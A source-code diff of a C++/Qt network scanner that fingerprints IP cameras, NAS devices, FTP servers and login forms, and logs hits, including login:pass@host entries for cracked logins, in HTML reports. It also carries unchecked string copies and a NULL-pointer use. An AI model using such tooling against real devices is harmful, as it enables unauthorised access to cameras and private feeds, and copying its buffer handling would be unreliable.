@@ -16,7 +16,7 @@ char* __cdecl strstri(char *_Str, const char *_SubStr)
 };
 
 bool gGlobalTrackLocked = false;
-char *FindFirstOcc(char *str, char *delim)
+char *_findFirstOcc(char *str, char *delim)
 {
 	int sz = strlen(str);
 	int dsz = strlen(delim);
@@ -28,7 +28,8 @@ char *FindFirstOcc(char *str, char *delim)
 		};
 	};
 
-	return str;
+	//return str;
+	return NULL;
 };
 char *FindLastOcc(char *str, char *delim)
 {
@@ -55,56 +56,84 @@ char *GetCodePage(char *str)
 		if(strstri((char *)(temp2 + strlen("<meta ")), "charset=") != NULL)
 		{
 			char *temp3 = strstri((char *)(temp2 + strlen("<meta ")), "charset=");
-			char *temp4 = FindFirstOcc((char *)(temp3 + strlen("charset=")), " \"'\n\r");
-			int ln = (int)(temp4 - temp3 - strlen("charset="));
-			if(ln > 16) 
+			char *temp4 = _findFirstOcc((char *)(temp3 + strlen("charset=")), " \"'\n\r");
+			if(temp4 != NULL)
 			{
-				return "WTF?";
+				int ln = (int)(temp4 - temp3 - strlen("charset="));
+				if(ln > 16) 
+				{
+					return "WTF?";
+				};
+				strncpy(cdpg, (char *)(temp3 + strlen("charset=")), (ln > 32) ? 32 : ln );
+				if(strstri(cdpg, "%s") != NULL) return "UTF-8";
+				return cdpg;
+			}
+			else
+			{
+				stt->doEmitionRedFoundData("[GetCodePage] [" + QString(temp3).mid(0, 16) + "]");
 			};
-			strncpy(cdpg, (char *)(temp3 + strlen("charset=")), (ln > 32) ? 32 : ln );
-			if(strstri(cdpg, "%s") != NULL) return "UTF-8";
-			return cdpg;
 		}
 		else if(strstri((char *)(temp2 + strlen("<meta ")), "charset = ") != NULL)
 		{
 			char *temp3 = strstri((char *)(temp2 + strlen("<meta ")), "charset = ");
-			char *temp4 = FindFirstOcc((char *)(temp3 + strlen("charset = ")), " \"'\n\r");
-			int ln = (int)(temp4 - temp3 - strlen("charset = "));
-			if(ln > 16) 
+			char *temp4 = _findFirstOcc((char *)(temp3 + strlen("charset = ")), " \"'\n\r");
+			if(temp4 != NULL)
 			{
-				return "WTF?";
+				int ln = (int)(temp4 - temp3 - strlen("charset = "));
+				if(ln > 16) 
+				{
+					return "WTF?";
+				};
+				strncpy(cdpg, (char *)(temp3 + strlen("charset = ")), (ln > 32) ? 32 : ln );
+				if(strstri(cdpg, "%s") != NULL) return "UTF-8";
+				return cdpg;
+			}
+			else
+			{
+				stt->doEmitionRedFoundData("[GetCodePage] [" + QString(temp3).mid(0, 16) + "]");
 			};
-			strncpy(cdpg, (char *)(temp3 + strlen("charset = ")), (ln > 32) ? 32 : ln );
-			if(strstri(cdpg, "%s") != NULL) return "UTF-8";
-			return cdpg;
 		}
 		else if(strstri((char *)(temp2 + strlen("<meta ")), "charset =") != NULL)
 		{
 			char *temp3 = strstri((char *)(temp2 + strlen("<meta ")), "charset =");
-			char *temp4 = FindFirstOcc((char *)(temp3 + strlen("charset =")), " \"'\n\r");
-			int ln = (int)(temp4 - temp3 - strlen("charset ="));
-			if(ln > 16) 
+			char *temp4 = _findFirstOcc((char *)(temp3 + strlen("charset =")), " \"'\n\r");
+			if(temp4 != NULL)
 			{
-				return "WTF?";
+				int ln = (int)(temp4 - temp3 - strlen("charset ="));
+				if(ln > 16) 
+				{
+					return "WTF?";
+				};
+				strncpy(cdpg, (char *)(temp3 + strlen("charset =")), (ln > 32) ? 32 : ln );
+				if(strstri(cdpg, "%s") != NULL) return "UTF-8";
+				return cdpg;
+			}
+			else
+			{
+				stt->doEmitionRedFoundData("[GetCodePage] [" + QString(temp3).mid(0, 16) + "]");
 			};
-			strncpy(cdpg, (char *)(temp3 + strlen("charset =")), (ln > 32) ? 32 : ln );
-			if(strstri(cdpg, "%s") != NULL) return "UTF-8";
-			return cdpg;
 		}
 		else
 		{
 			if(strstri(str, "charset=") != NULL)
 			{
 				char *temp2 = strstri(str, "charset=");
-				char *temp3 = FindFirstOcc((char *)(temp2 + strlen("charset=")), " \"'\n\r");
-				int ln = (int)(temp3 - temp2 - strlen("charset="));
-				if(ln > 16) 
+				char *temp3 = _findFirstOcc((char *)(temp2 + strlen("charset=")), " \"'\n\r");
+				if(temp3 != NULL)
 				{
-					return "WTF?";
-				};
-				strncpy(cdpg, (char *)(temp2 + strlen("charset=")), (ln > 32) ? 32 : ln );
-				if(strstri(cdpg, "%s") != NULL) return "UTF-8";
-				return cdpg;	
+					int ln = (int)(temp3 - temp2 - strlen("charset="));
+					if(ln > 16) 
+					{
+						return "WTF?";
+					};
+					strncpy(cdpg, (char *)(temp2 + strlen("charset=")), (ln > 32) ? 32 : ln );
+					if(strstri(cdpg, "%s") != NULL) return "UTF-8";
+					return cdpg;
+				}
+				else
+				{
+					stt->doEmitionRedFoundData("[GetCodePage] [" + QString(temp3).mid(0, 16) + "]");
+				}
 			}
 			else
 			{
@@ -115,22 +144,29 @@ char *GetCodePage(char *str)
 	else if(strstri(str, "charset=") != NULL)
 	{
 		char *temp2 = strstri(str, "charset=");
-		char *temp3 = FindFirstOcc((char *)(temp2 + strlen("charset=")), " \"'\n\r");
-		int ln = (int)(temp3 - temp2 - strlen("charset="));
-		if(ln > 16) 
+		char *temp3 = _findFirstOcc((char *)(temp2 + strlen("charset=")), " \"'\n\r");
+		if(temp3 != NULL)
 		{
-			return "WTF?";
+			int ln = (int)(temp3 - temp2 - strlen("charset="));
+			if(ln > 16) 
+			{
+				return "WTF?";
+			};
+			strncpy(cdpg, (char *)(temp2 + strlen("charset=")), (ln > 32) ? 32 : ln );
+			if(strstri(cdpg, "%s") != NULL) return "UTF-8";
+			return cdpg;
+		}
+		else
+		{
+			stt->doEmitionRedFoundData("[GetCodePage] [" + QString(temp3).mid(0, 16) + "]");
 		};
-		strncpy(cdpg, (char *)(temp2 + strlen("charset=")), (ln > 32) ? 32 : ln );
-		if(strstri(cdpg, "%s") != NULL) return "UTF-8";
-		return cdpg;	
 	}
 	else
 	{
 		return "NULL";
 	};
 };
-int Lexems::globalSearchNeg(const char *buffcp, char *ip)
+int Lexems::globalSearchNeg(const char *buffcp, char *ip, int port)
 {
 	if(strlen(buffcp) == 0) return -1;
 		
@@ -149,7 +185,7 @@ int Lexems::globalSearchNeg(const char *buffcp, char *ip)
 			{
 				if(gNegDebugMode)
 				{
-					stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + "\"><font color=\"#0084ff\">" + QString(ip) + "</font></a>" + "] Negative hit: \"" + QString::fromLocal8Bit(negWord).toHtmlEscaped() + "\"");
+					stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "/\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Negative hit: \"" + QString::fromLocal8Bit(negWord).toHtmlEscaped() + "\"");
 					if(strlen(negWord) < 2) 
 					{
 						stt->doEmitionDebugFoundData("		Len:" + QString::number(strlen(negWord)));
@@ -232,7 +268,6 @@ int _mainFinderFirst(char *buffcp, int f, int port, char *ip)
 	if(strstr(buffcpy, "ip camera control webpage") != NULL && strstr(buffcpy, "/main/cs_motion.asp") != NULL) return 22; //ip camera control
 	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/live/index2.html") != NULL) return 23; //network camera BB-SC384
 	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/viewer/live/en/live.html") != NULL) return 24; //Network Camera VB-M40
-	
 	if(strstr(buffcpy, "panasonic ") != NULL && strstr(buffcpy, ":60002/snapshotjpeg") != NULL) return 25; //Panasonic wtfidonteven-camera
 	if(strstr(buffcpy, "sony network camera") != NULL && strstr(buffcpy, "/command/inquiry.cgi?") != NULL) return 26; //Sony Network Camera
 	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "src=\"webs.cgi?") != NULL) return 27; //UA Network Camera
@@ -242,43 +277,53 @@ int _mainFinderFirst(char *buffcp, int f, int port, char *ip)
 	if(strstr(buffcpy, "nas") != NULL && strstr(buffcpy, "/cgi-bin/data/viostor-220/viostor/viostor.cgi") != NULL) return 30; //NAX
 	if(strstr(buffcpy, "ip camera") != NULL && strstr(buffcpy, "check_user.cgi") != NULL) return 31; //ip cams
 	if(strstr(buffcpy, "ws(\"user\");") != NULL && strstr(buffcpy, "src=\"/tool.js") != NULL && strstr(buffcpy, "<b class=\"xb1\"></b>") != NULL) return 32; //IPC web ip cam
-	if(strstr(buffcpy, "geovision") != NULL && strstr(buffcpy, "ip camera") != NULL) return 33; //GEO web ip cam
-
+	if(strstr(buffcpy, "geovision") != NULL && (strstr(buffcpy, "ip camera") != NULL || strstr(buffcpy, "ssi.cgi/login.htm") != NULL)) return 33; //GEO web ip cam
+	if(strstr(buffcpy, "hikvision-webs") != NULL || (strstr(buffcpy, "hikvision digital") != NULL && strstr(buffcpy, "dvrdvs-webs") != NULL)
+		|| (strstr(buffcpy, "lapassword") != NULL && strstr(buffcpy, "lausername") != NULL && strstr(buffcpy, "dologin()") != NULL)) return 34; //hikvision cam
+	if(strstr(buffcpy, "easy cam") != NULL && strstr(buffcpy, "easy life") != NULL) return 35; //EasyCam
+	if(strstr(buffcpy, "panasonic") != NULL && (strstr(buffcpy, "/config/cam_portal.cgi") != NULL || strstr(buffcpy, "/config/easy_index.cgi") != NULL)) return 36; //Panasonic Cam
+	if(strstr(buffcpy, "panasonic") != NULL && strstr(buffcpy, "/view/getuid.cgi") != NULL) return 37; //Panasonic Cam WJ-HD180
+	if(strstr(buffcpy, "ipcam client") != NULL && strstr(buffcpy, "plugins.xpi") != NULL && strstr(buffcpy, "js/upfile.js") != NULL) return 38; //Foscam
+	if(strstr(buffcpy, "ip surveillance") != NULL && strstr(buffcpy, "customer login") != NULL) return 39; //EagleEye
+	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/admin/index.shtml?") != NULL) return 40; //Network Camera VB-C300
+	if(strstr(buffcpy, "sq-webcam") != NULL && strstr(buffcpy, "liveview.html") != NULL) return 41; //AVIOSYS-camera
+	 
 	if(((strstr(buffcpy, "220") != NULL) && (port == 21)) || 
 		(strstri(buffcpy, "220 diskStation ftp server ready") != NULL) ||
 		(strstri(buffcpy, "220 ftp server ready") != NULL)
 		|| strstr(buffcpy, "500 'get': command not understood") != NULL
 		) return 16; // 16 - FTP
-	
+	if(strstr(buffcpy, "camera web server") != NULL		|| strstr(buffcpy, "webcamxp 5") != NULL
+		|| strstr(buffcpy, "ip box camera") != NULL		|| strstr(buffcpy, "snaff") != NULL
+		|| strstr(buffcpy, "hfs /") != NULL				|| strstr(buffcpy, "httpfileserver") != NULL
+		|| strstr(buffcpy, "network camera server") != NULL
+		|| strstr(buffcpy, "ipcamera") != NULL			|| strstr(buffcpy, "$lock extended") != NULL
+		|| strstr(buffcpy, "ip camera") != NULL
+		|| strstr(buffcpy, "ipcam_language") != NULL
+		|| strstr(buffcpy, "/viewer/video.jpg") != NULL || strstr(buffcpy, "smart ip device") != NULL
+		|| strstr(buffcpy, "sanpshot_icon") != NULL		|| strstr(buffcpy, "snapshot_icon") != NULL
+		|| strstr(buffcpy, "ipcam") != NULL
+		) return 0;
 	if(strstr(buffcpy, "<form ") != NULL && strstr(buffcpy, "302 found") == NULL)
 	{
-		if(l.globalSearchNeg(buffcp, ip) == -1) return -1;
+		if(l.globalSearchNeg(buffcp, ip, port) == -1) return -1;
 		if(globalSearchPrnt(buffcp) == -1) return -1;
 		return 10;
 	};
 
-	if(strstr(buffcpy, "camera web server") != NULL		|| strstr(buffcpy, "webcamxp 5") != NULL
-		|| strstr(buffcpy, "ip box camera") != NULL		|| strstr(buffcpy, "snaff") != NULL
-		|| strstr(buffcpy, "hfs /") != NULL				|| strstr(buffcpy, "httpfileserver") != NULL
-		|| strstr(buffcpy, "vilar ipcamera") != NULL	|| strstr(buffcpy, "network camera server") != NULL
-		|| strstr(buffcpy, "ipcamera") != NULL			|| strstr(buffcpy, "$lock extended") != NULL
-		|| strstr(buffcpy, "ip camera") != NULL			|| strstr(buffcpy, "network ip camera") != NULL
-		|| strstr(buffcpy, "ipcam_language") != NULL
-		|| strstr(buffcpy, "/viewer/video.jpg") != NULL || strstr(buffcpy, "smart ip device") != NULL
-		|| strstr(buffcpy, "sanpshot_icon") != NULL		|| strstr(buffcpy, "snapshot_icon") != NULL
-		) return 0;
-	if(l.globalSearchNeg(buffcp, ip) == -1) return -1;
+	if(l.globalSearchNeg(buffcp, ip, port) == -1) return -1;
 	if(globalSearchPrnt(buffcp) == -1) return -1;
 
-	if(strlen(buffcpy) <= 160 && port != 21)
-	{
-		if(gNegDebugMode)
-		{
-			stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Ignoring: Size &lt; 160 bytes.");
-		};
-		return -1;
-	}
-	else if(strlen(buffcpy) < 500) 
+	//if(strlen(buffcpy) <= 160 && port != 21 && strstr(buffcpy, "[OVERFLOW]") == NULL)
+	//{
+	//	if(gNegDebugMode)
+	//	{
+	//		stt->doEmitionDebugFoundData("[<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#0084ff\">" + QString(ip) + ":" + QString::number(port) + "</font></a>" + "] Ignoring: Size &lt; 160 bytes.");
+	//	};
+	//	return -1;
+	//}
+	//else 
+	if(strlen(buffcpy) < 500) 
 	{
 		if(f) return 7;
 	};
@@ -331,36 +376,45 @@ int _mainFinderSecond(char *buffcp, int port, char *ip)
 	if(strstr(buffcpy, "nas") != NULL && strstr(buffcpy, "/cgi-bin/data/viostor-220/viostor/viostor.cgi") != NULL) return 30; //NAX
 	if(strstr(buffcpy, "ip camera") != NULL && strstr(buffcpy, "check_user.cgi") != NULL) return 31; //axis cameras
 	if(strstr(buffcpy, "ws(\"user\");") != NULL && strstr(buffcpy, "src=\"/tool.js") != NULL && strstr(buffcpy, "<b class=\"xb1\"></b>") != NULL) return 32; //web ip cam
-	if(strstr(buffcpy, "geovision") != NULL && strstr(buffcpy, "ip camera") != NULL) return 33; //GEO web ip cam
+	if(strstr(buffcpy, "geovision") != NULL && (strstr(buffcpy, "ip camera") != NULL || strstr(buffcpy, "ssi.cgi/login.htm") != NULL)) return 33; //GEO web ip cam
+	if(strstr(buffcpy, "hikvision-webs") != NULL || (strstr(buffcpy, "hikvision digital") != NULL && strstr(buffcpy, "dvrdvs-webs") != NULL)
+		|| (strstr(buffcpy, "lapassword") != NULL && strstr(buffcpy, "lausername") != NULL && strstr(buffcpy, "dologin()") != NULL)) return 34; //hikvision cam
+	if(strstr(buffcpy, "easy cam") != NULL && strstr(buffcpy, "easy life") != NULL) return 35; //EasyCam
+	if(strstr(buffcpy, "panasonic") != NULL && (strstr(buffcpy, "/config/cam_portal.cgi") != NULL || strstr(buffcpy, "/config/easy_index.cgi") != NULL)) return 36; //Panasonic Cam
+	if(strstr(buffcpy, "panasonic") != NULL && strstr(buffcpy, "/view/getuid.cgi") != NULL) return 37; //Panasonic Cam WJ-HD180
+	if(strstr(buffcpy, "ipcam client") != NULL && strstr(buffcpy, "plugins.xpi") != NULL && strstr(buffcpy, "js/upfile.js") != NULL) return 38; //Foscam
+	if(strstr(buffcpy, "ip surveillance") != NULL && strstr(buffcpy, "customer login") != NULL) return 39; //EagleEye
+	if(strstr(buffcpy, "network camera") != NULL && strstr(buffcpy, "/admin/index.shtml?") != NULL) return 40; //Network Camera VB-C300
+	if(strstr(buffcpy, "sq-webcam") != NULL && strstr(buffcpy, "liveview.html") != NULL) return 41; //AVIOSYS-camera
 
 	if(((strstr(buffcpy, "220") != NULL) && (port == 21)) || 
 		(strstr(buffcpy, "220 diskStation ftp server ready") != NULL) ||
 		(strstr(buffcpy, "220 ftp server ready") != NULL)
 		|| strstr(buffcpy, "500 'get': command not understood") != NULL
 		) return 16; // 16 - FTP
+	
+	if(strstr(buffcpy, "camera web server") != NULL		|| strstr(buffcpy, "webcamxp 5") != NULL
+		|| strstr(buffcpy, "ip box camera") != NULL		|| strstr(buffcpy, "snaff") != NULL
+		|| strstr(buffcpy, "hfs /") != NULL				|| strstr(buffcpy, "httpfileserver") != NULL
+		|| strstr(buffcpy, "network camera server") != NULL
+		|| strstr(buffcpy, "ipcamera") != NULL			|| strstr(buffcpy, "$lock extended") != NULL
+		|| strstr(buffcpy, "ip camera") != NULL
+		|| strstr(buffcpy, "ipcam_language") != NULL
+		|| strstr(buffcpy, "/viewer/video.jpg") != NULL || strstr(buffcpy, "smart ip device") != NULL
+		|| strstr(buffcpy, "sanpshot_icon") != NULL		|| strstr(buffcpy, "snapshot_icon") != NULL
+		|| strstr(buffcpy, "ipcam") != NULL
+		) return 0;
 
 	if(strstr(buffcpy, "<form ") != NULL && strstr(buffcpy, "302 found") == NULL) 
 	{
-		if(l.globalSearchNeg(buffcp, ip) == -1) return -1;
+		if(l.globalSearchNeg(buffcp, ip, port) == -1) return -1;
 		if(globalSearchPrnt(buffcp) == -1) return -1;
 		return 10;
 	};
 
-	if(strstr(buffcpy, "camera web server") != NULL		|| strstr(buffcpy, "webcamxp 5") != NULL
-		|| strstr(buffcpy, "ip box camera") != NULL		|| strstr(buffcpy, "snaff") != NULL
-		|| strstr(buffcpy, "hfs /") != NULL				|| strstr(buffcpy, "httpfileserver") != NULL
-		|| strstr(buffcpy, "vilar ipcamera") != NULL	|| strstr(buffcpy, "network camera server") != NULL
-		|| strstr(buffcpy, "ipcamera") != NULL			|| strstr(buffcpy, "$lock extended") != NULL
-		|| strstr(buffcpy, "ip camera") != NULL			|| strstr(buffcpy, "network ip camera") != NULL
-		|| strstr(buffcpy, "ipcam_language") != NULL
-		|| strstr(buffcpy, "/viewer/video.jpg") != NULL || strstr(buffcpy, "smart ip device") != NULL
-		|| strstr(buffcpy, "sanpshot_icon") != NULL		|| strstr(buffcpy, "snapshot_icon") != NULL
-		) return 0;
-	
-	if(l.globalSearchNeg(buffcp, ip) == -1) return -1;
+	if(l.globalSearchNeg(buffcp, ip, port) == -1) return -1;
 	if(globalSearchPrnt(buffcp) == -1) return -1;
 	
-
 	return 3; //Suspicious
 };
 
@@ -460,7 +514,7 @@ bool ftsBA = true;
 bool ftsLF = true;
 
 bool fOpened = false;
-char styleBuff[1024] = {"<style> body { background-color: #141414; font-family: monospace; font-size:95%;} #ipd{background:black;width:100%;white-space:nowrap;overflow-x:none;display:inline-block;}#ipd:hover{color: #909090;background:#202020;}#tit{text-align:center;border:1px solid #5d5d5d;}a{color: gray;text-decoration: underline;} a:focus{ outline-style: dashed;outline-width:1px; outline-color: red;}</style>"};
+char styleBuff[1024] = {"<style> #recvSpan{display: inline-block;width: 150px;} #hostSpan{display: inline-block;width: 150px;}body { background-color: #141414; font-family: monospace; font-size:95%;} #ipd{background:black;width:100%;white-space:nowrap;overflow-x:none;display:inline-block;}#ipd:hover{color: #909090;background:#202020;}#tit{text-align:center;border:1px solid #5d5d5d;}a{color: gray;text-decoration: underline;} a:focus{ outline-style: dashed;outline-width:1px; outline-color: red;}</style>"};
 char topBuff[1024] = {"<div id=\"tit\"><a href=\"strange.html\">.strange</a> <a href=\"other.html\">.other</a> <a href=\"Basicauth.html\">.BasicAuth</a> <a href=\"FTP.html\">.FTP</a>  <a href=\"low_loads.html\">.LowLoads</a> <a href=\"LoginForms.html\">.loginforms</a> <a href=\"SSH.html\">.SSH</a></div><br><br>"};
 void fputsf(char *ip, char *port, char *text, int flag, char *msg)
 {
@@ -512,13 +566,28 @@ void fputsf(char *ip, char *port, char *text, int flag, char *msg)
 #pragma endregion
 	if(file != NULL)
 	{
+		time_t rtime;
+		time(&rtime);
+		if(horLineFlag == false) 
+		{
+			horLineFlag = true;
+			char delimiter[128] = {0};
+			char cdate[32] = {0};
+			strcpy (cdate, "[");
+			strcat (cdate, ctime (&rtime));
+			memset (cdate + strlen(cdate) - 1, '\0', 1);
+			strcat (cdate, "] ");
+			strcpy(delimiter, "<hr><center><h5><font color=\"#a1a1a1\">");
+			strcat(delimiter, cdate);
+			strcat(delimiter, "</font></h5></center><hr>");
+			fputs (delimiter, file);
+		};
 		++saved;
 		char *string = new char[strlen(text) + 512];
 		if(flag != -22) 
 		{
 			strcpy (string, "<div id=\"ipd\" style=\"color:#707070;text-decoration: none;\">");
-			time_t rtime;
-			time(&rtime);
+			
 			char cdate[32] = {0};
 			strcat (cdate, "[");
 			strcat (cdate, ctime (&rtime));
@@ -531,8 +600,7 @@ void fputsf(char *ip, char *port, char *text, int flag, char *msg)
 		else
 		{
 			strcpy (string, "<div id=\"ipd\" style=\"color:#707070;\">");
-			time_t rtime;
-			time(&rtime);
+			
 			char cdate[32] = {0};
 			strcat (cdate, "[");
 			strcat (cdate, ctime (&rtime));
@@ -622,7 +690,7 @@ void fputsf(char *ip, char *port, char *text, int flag, char *msg)
 		{
 			if(innerCounter > 20)
 			{
-				stt->doEmitionRedFoundData("Write file loop detected!");
+				stt->doEmitionRedFoundData("\"fOpened\" loop detected!");
 				break;
 			};
 			++innerCounter;
@@ -646,17 +714,12 @@ void putInFile(int flag, char *ip, char *port, int recd, char *finalstr, char *h
 {
 	char log[4096] = {0}, msg[512] = {0};
 		
-	if(flag == 0 || flag == 15 || flag == -10) strcpy(msg, "Anomaly - ");
-	else if(flag == 3) strcpy(msg, "Suspicious - ");
-	else if(flag == 9) strcpy(msg, "Timeout - ");
-	else if(flag == 7) strcpy(msg, "Low Load - ");
-	else if(flag == 8) strcpy(msg, "Forbidden - ");
-	else if(flag == 6) strcpy(msg, "Not Found - ");
-	else if(flag == 5 && mode != 1) strcpy(msg, "Bad Address - ");
-	else if(flag == 4) strcpy(msg, "Bad Request - ");
-	else if(flag == 2) strcpy(msg, "Printer  - ");
-	else if(flag == 666 || flag == 350) strcpy(msg, "Strange Error - ");
-	else if(flag == 10) strcpy(msg, "Login form - ");
+	if(flag == 0 || flag == 15 || flag == -10) strcpy(msg, "[A]:");
+	else if(flag == 3) strcpy(msg, "[S]:");
+	else if(flag == 7) strcpy(msg, "[LL]:");
+	else if(flag == 2) strcpy(msg, "[P]:");
+	else if(flag == 666 || flag == 350) strcpy(msg, "[Strange Error]:");
+	else if(flag == 10) strcpy(msg, "[LF]:");
 
 	QTextCodec *codec;
 	strcat(msg, "<a href=\"http://");
@@ -689,11 +752,11 @@ void putInFile(int flag, char *ip, char *port, int recd, char *finalstr, char *h
 	else strf = QString(finalstr);
 	if(flag != 6 && flag != 5 && flag != 4 && flag != 666 && flag != 350)
 	{
-		strcat(msg, " <font color=\"#0084ff\">Title: </font><font color=\"#ff9600\">");
+		strcat(msg, " <font color=\"#0084ff\">: </font><font color=\"#ff9600\">");
 		int sz = strf.size();
 		strncat(msg, QString::fromLocal8Bit(finalstr).toHtmlEscaped().toLocal8Bit().data(), (sz < 128 ? sz : 128));
 		strcat(msg, "</font>");
-		resMes += " <font color=\"#0084ff\">Title: </font><font color=\"#ff9600\">" + QString(finalstr).toHtmlEscaped() + "</font>";
+		resMes += " <font color=\"#0084ff\">: </font><font color=\"#ff9600\">" + QString(finalstr).toHtmlEscaped() + "</font>";
 	};
 #pragma region QTGUI_Area
 	stt->doEmitionFoundData(resMes);
@@ -713,15 +776,15 @@ void putInFile(int flag, char *ip, char *port, int recd, char *finalstr, char *h
 		};
 	}
 	else strcat(log, " ");
-	strcat(log, "<a href=\"http://");
+	strcat(log, "<span id=\"hostSpan\"><a href=\"http://");
 	strcat(log, ip);
 	strcat(log, ":");
 	strcat(log, port);
-	strcat(log, "\"><font color=MediumSeaGreen>");
+	strcat(log, "\"/><font color=MediumSeaGreen>");
 	strcat(log, ip);
 	strcat(log, ":");
 	strcat(log, port);
-	strcat(log, "</font></a>; Received: <font color=SteelBlue>");
+	strcat(log, "</font></a>;</span> <span id=\"recvSpan\">Received: <font color=SteelBlue>");
 	strcat(log, std::to_string((long double)recd).c_str());
 	strcat(log, "</font>");
 	
@@ -756,7 +819,7 @@ void putInFile(int flag, char *ip, char *port, int recd, char *finalstr, char *h
 
 	if(flag != 6 && flag != 5 && flag != 4)
 	{
-		strcat(log, "; Title: <font color=GoldenRod>");
+		strcat(log, ";</span> T: <font color=GoldenRod>");
 
 		strncat(log, QString::fromLocal8Bit(finalstr).toHtmlEscaped().toLocal8Bit().data(), 100);
 		strcat(log, "</font>");
@@ -773,8 +836,8 @@ void _specFillerBA(char *hl, char *ip, char *port, char *finalstr, char *login, 
 	
 	++PieBA;
 	
-	strcpy(log, "[BA] ");
-	strcat(log, "<a href=\"http://");
+	strcpy(log, "[BA]:");
+	strcat(log, "<span id=\"hostSpan\"><a href=\"http://");
 	strcat(log, login);
 	strcat(log, ":");
 	strcat(log, pass);
@@ -788,7 +851,7 @@ void _specFillerBA(char *hl, char *ip, char *port, char *finalstr, char *login, 
 	strcat(log, "@");
 	strcat(log, ip);
 	strcat(log, port);
-	strcat(log, "</font></a> Title: <font color=GoldenRod>");
+	strcat(log, "</font></a></span> T: <font color=GoldenRod>");
 	strcat(log, finalstr);
 	strcat(log, "</font>");
 	strcat(log, "\n");
@@ -803,8 +866,8 @@ void _specFillerWF(char *hl, char *ip, char *port, char *finalstr, char *login, 
 	
 	++PieWF;
 	
-	strcpy(log, "[WF] ");
-	strcat(log, "<a href=\"http://");
+	strcpy(log, "[WF]:");
+	strcat(log, "<span id=\"hostSpan\"><a href=\"http://");
 	strcat(log, ip);
 	strcat(log, ":");
 	strcat(log, port);
@@ -812,7 +875,7 @@ void _specFillerWF(char *hl, char *ip, char *port, char *finalstr, char *login, 
 	strcat(log, ip);
 	strcat(log, ":");
 	strcat(log, port);
-	strcat(log, "</font></a> Title: <font color=GoldenRod>");
+	strcat(log, "</font></a></span> T: <font color=GoldenRod>");
 	strcat(log, finalstr);
 	strcat(log, "</font> Pass: <font color=SteelBlue>"); 
 	strcat(log, login);
@@ -825,7 +888,7 @@ void _specFillerWF(char *hl, char *ip, char *port, char *finalstr, char *login, 
 #pragma endregion
 	fputsf (ip, port, log , flag, "Web Form");
 };
-void _getFormVal(char *data, char *result, char *key)
+void _getFormVal(char *data, char *result, char *key, char *path = NULL)
 {
 	char parVal[256] = {0};
 	int psz = 0;
@@ -842,39 +905,104 @@ void _getFormVal(char *data, char *result, char *key)
 	int sz = 0;
 	char parVal2[256] = {0};
 
+	char startPath[256] = {0};
+	if(strcmp(key, "action") == 0)
+	{
+		if(strstr(path, "./") == NULL)
+		{
+			char *ptrP1 = FindLastOcc(path, "/");
+			if(ptrP1 != path)
+			{
+				int pSz = ptrP1 -path;
+				strncpy(startPath, path, pSz);
+			};
+		};
+	};
 	char *keyResult1 = strstri(parVal, key);
 	if(keyResult1 != NULL)
 	{
-		char *pkeyResult2 = FindFirstOcc(keyResult1, " >");
-		if(pkeyResult2 != keyResult1)
+		char *pkeyResult2 = _findFirstOcc(keyResult1, " >");
+		if(pkeyResult2 != NULL)
 		{
 			int psz2 = pkeyResult2 - keyResult1;
 			strncpy(parVal2, keyResult1, (psz2 < 256 ? psz2 : 256));
 
-			char *keyResult2 = FindFirstOcc(parVal2, "'\"");
-			if(keyResult2 != NULL && keyResult2 != parVal2)
+			char *keyResult2 = _findFirstOcc(parVal2, "'\"");
+			if(keyResult2 != NULL)
 			{
-				char *keyResult3 = FindFirstOcc(keyResult2 + 1, "'\"> ");
-				if(keyResult3 != NULL && keyResult3 != keyResult2)
+				char *keyResult3 = _findFirstOcc(keyResult2 + 1, "'\"> ");
+				if(keyResult3 != NULL)
 				{
 					sz = keyResult3 - keyResult2 - 1;
-					strncpy(result, keyResult2 + 1, sz);
+					char tempRes[256] = {0};
+					if(strstr(keyResult2, "./") != NULL) 
+					{
+						strcpy(result, startPath);
+						strncpy(tempRes, keyResult2 + 2, sz - 1);
+						if(tempRes[0] != '/') strcat(result, "/");
+						strcat(result, tempRes);
+					}
+					else if(strstr(keyResult2, "/") == NULL)
+					{
+						if(strcmp(key, "action") == 0)
+						{
+							strcpy(result, startPath);
+							strncpy(tempRes, keyResult2 + 1, sz);
+							if(tempRes[0] != '/') strcat(result, "/");
+							strcat(result, tempRes);
+						}
+						else
+						{
+							strncpy(result, keyResult2 + 1, sz);							
+						};
+					}
+					else
+					{
+						strncpy(result, keyResult2 + 1, sz);
+					};
 				};
 			}
 			else
 			{
-				keyResult2 = FindFirstOcc(parVal2, "=");
-				if(keyResult2 != NULL && keyResult2 != parVal2)
+				keyResult2 = _findFirstOcc(parVal2, "=");
+				if(keyResult2 != NULL)
 				{
-					char *keyResult3 = FindFirstOcc(keyResult2, "'\"> ");
-					if(keyResult3 != keyResult2 )
+					char *keyResult3 = _findFirstOcc(keyResult2, "'\"> ");
+					if(keyResult3 != NULL )
 					{
 						sz = keyResult3 - keyResult2 - 1;
 						strncpy(result, keyResult2 + 1, sz);
+						char tempRes[256] = {0};
+						if(strstr(keyResult2, "./") != NULL) 
+						{
+							strcpy(result, startPath);
+							strncpy(tempRes, keyResult2 + 2, sz - 1);
+							if(tempRes[0] != '/') strcat(result, "/");
+							strcat(result, tempRes);
+						}
+						else if(strstr(keyResult2, "/") == NULL)
+						{
+							if(strcmp(key, "action") == 0)
+							{
+								strcpy(result, startPath);
+								strncpy(tempRes, keyResult2 + 1, sz);
+								if(tempRes[0] != '/') strcat(result, "/");
+								strcat(result, tempRes);
+							}
+							else
+							{
+								strncpy(result, keyResult2 + 1, sz);
+							};
+						}
+						else
+						{
+							strncpy(result, keyResult2 + 1, sz);
+						};
 					}
 					else
 					{
-						strcpy(result, keyResult2 + 1);					
+						strcpy(result, startPath);
+						strcat(result, keyResult2 + 1);
 					};
 				}
 			};
@@ -882,12 +1010,12 @@ void _getFormVal(char *data, char *result, char *key)
 		}
 		else
 		{
-			stt->doEmitionFoundData("[WF]: GetParam - Cannot localize field.");				
